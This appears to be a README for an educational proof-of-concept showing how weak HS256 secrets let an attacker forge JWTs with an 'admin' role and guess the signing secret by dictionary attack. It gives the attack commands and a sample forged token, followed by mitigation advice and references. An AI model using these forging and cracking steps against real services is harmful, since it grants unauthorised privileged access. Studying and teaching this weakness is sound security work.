# JWT Security Task — PoC & Notes

**Author:** Prethivi V.S.  
**Date:** 2025-08-28

This PoC demonstrates how **weak HS256 secrets** allow an attacker to **forage/forgery** JSON Web Tokens (JWTs) and optionally perform a small **dictionary-based secret guess** against an existing token. For educational use on your own systems only.

## Quick start

```bash
python -m venv .venv && source .venv/bin/activate  # on Windows: .venv\Scripts\activate
pip install pyjwt
python jwt_attack_demo.py forge --secret secret123 --sub alice --role admin --exp-min 10
```

Sample output (token truncated):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAzNjAwLCJpc3MiOiJqd3QtcG9jLWxvY2FsIiwiYXVkIjoiand0LXBvYy1jbGllbnQifQ.∎∎∎
[+] Forged HS256 token with role='admin' (expires in 10 min).
```

To attempt a small **dictionary guess** against a token you obtained *legally* in a test lab:

```bash
python jwt_attack_demo.py crack --token "<PASTE_JWT_HERE>"
# Optionally add --wordlist rockyou-mini.txt
```

> If the secret is recovered, you can re‑encode a token with elevated claims using `forge`.

## Why this is a vulnerability?

If an API signs JWTs with **guessable secrets** (e.g., `secret`, `password`, `secret123`), an attacker can mint arbitrary admin tokens. Strong, randomly generated secrets (≥256 bits) or asymmetric keys (RS256/ES256) with robust key management mitigate this class of attacks.

## References

- OWASP JSON Web Token (JWT) Cheat Sheet — secure design/validation guidance.  
- NVD (NIST) — search for historical JWT-related CVEs (e.g., alg confusion, libraries mishandling `none`).  
- PyJWT docs — usage & security notes.

See the 1–2 page **research_report.pdf** in this folder for deeper coverage and citations.
